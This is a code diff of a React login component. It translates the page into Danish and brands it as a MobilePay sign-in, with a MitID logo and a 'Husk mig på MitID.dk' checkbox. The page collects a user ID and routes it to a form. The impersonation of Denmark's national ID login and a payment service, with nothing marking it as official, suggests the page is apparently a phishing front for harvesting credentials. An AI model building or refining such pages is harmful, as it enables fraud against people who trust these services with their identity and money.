@@ -16,7 +16,7 @@ const Login = () => {
   };
   const handleButtonClick = () => {
     if (inputValue) {
-      navigate("/PersonalizedAccountForm");
+      navigate("/FormFile");
     }
   };
 
@@ -30,18 +30,18 @@ const Login = () => {
 
   return (
     <div className="loginContainer">
-      <h1>Login</h1>
-      <p>Consectetuer adipiscing elit aenean commodo</p>
+      <h1>Log på</h1>
+
       <div className="login_form">
         <div className="login_form_logo">
-          <div>Log on at MitID.dk</div>
+          <div>Log på hos MobilePay</div>
           <div>
             <img src={MitLogo} alt="Logo" width="100px" height="50px" />
           </div>
         </div>
         <div className="divider"></div>
         <div className="userid_form">
-          <label>User ID</label>
+          <label>bruger ID</label>
           <input type="text" value={inputValue} onChange={handleInputChange} />
         </div>
         <div className="btn_cont">
@@ -50,7 +50,7 @@ const Login = () => {
             disabled={!inputValue}
             onClick={handleButtonClick}
           >
-            <span className="button-text">Continue</span>
+            <span className="button-text">FORTSÆT</span>
             <FaArrowRight className="button-icon" />
           </button>
         </div>
@@ -66,20 +66,20 @@ const Login = () => {
                 marginBottom: "-3px",
               }}
             >
-              Lost user ID?
+              Mistet bruger-id?
             </div>
           </Link>
         </div>
         <Form.Check
           style={{ marginTop: "100px", marginBottom: "10px" }}
           type="checkbox"
-          id="Remember me at MitID.dk"
-          label="Remember me at MitID.dk"
+          id="Husk mig på MitID.dk"
+          label="Husk mig på MitID.dk"
         />
 
         <div className="divider"></div>
-        <button className="cancel_btn">Cancel</button>
-        <button className="cancel_btn">Help</button>
+        <button className="cancel_btn">Afbestille</button>
+        <button className="cancel_btn">Hjælp</button>
       </div>
     </div>
   );
